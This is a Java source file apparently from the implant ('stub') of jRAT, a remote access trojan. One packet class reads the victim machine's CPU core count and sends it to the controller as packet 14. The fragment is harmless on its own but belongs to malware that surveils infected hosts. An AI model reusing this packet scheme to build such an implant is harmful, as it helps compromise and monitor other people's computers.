package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet14InitAvailableCores extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		short cores = (short) Runtime.getRuntime().availableProcessors();
		
		dos.writeShort(cores);
	}

	@Override
	public byte getPacketId() {
		return (byte) 14;
	}
}
